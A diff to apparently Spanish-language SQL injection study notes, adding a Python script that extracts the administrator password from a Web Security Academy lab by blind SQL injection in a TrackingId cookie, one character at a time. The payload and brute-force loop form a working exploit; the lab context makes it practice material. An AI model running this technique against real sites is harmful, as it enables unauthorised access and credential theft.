@@ -161,6 +161,82 @@ si se puede usar -- pero requiere que se use un espacio al ultimo asi "-- " (sin
 
 ```
 
+# s4vitar
+
+> pip3 install pwntools
+
+## Script para Blind SQL injection with conditional responses (ejercicio para practicar python)
+
+```python
+
+#!/usr/bin/python3
+
+
+from pwn import *
+import requests, signal, time, pdb,sys, string#pdb para hacer debugging y 
+#string para definiciones de caracteres
+#import string
+#
+#string.ascii_lowercase
+#>>abcdef...
+#string.digits
+#>>012346...
+#string.puntuation
+#>> salentodoslossignosdepuntuacion
+#Para imprimirlos todos usa mayusculas minusculas etc
+#string.printable
+
+def def_handler(sig, frame):
+	print("\n\n [!] Saliendo.^.\n")
+	sys.exit(1)
+
+main_url="https://0ad500f40378426ec0e710a000e1005f.web-security-academy.net"
+characters = string.ascii_lowercase + string.digits
+
+
+def makeRequest():
+	password = ""
+
+	p1 = log.progress("Fuerza Bruta")
+	p1.status("Iniciando ataque de fuerza bruta")
+
+	time.sleep(2)
+
+	p2 = log.progress("Password")
+
+	for position in range(1,21):#Recordar lo hace del 1 al 20
+		for character in characters:
+
+			cookies = {
+
+				'TrackingId': "USt7UKseU00I52be' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position,character),
+				'session': 'S1AqgdciZYIY6zutQrKkUQqmiUShSTmA'
+			}
+
+			p1.status(cookies['TrackingId'])
+
+			r= requests.get(main_url,cookies=cookies)
+
+			if "Welcome back!" in r.text:
+				password += character
+				p2.status(password)
+				break#para que no continue probando el resto de caracteres!
+
+
+#Ctrl+C
+
+signal.signal(signal.SIGINT, def_handler)
+
+if __name__ == '__main__':
+	#time.sleep(10)
+	makeRequest()
+
+
+
+```
+
+
+
 # Bibliografia o Recursos Consultados
 
 > https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635
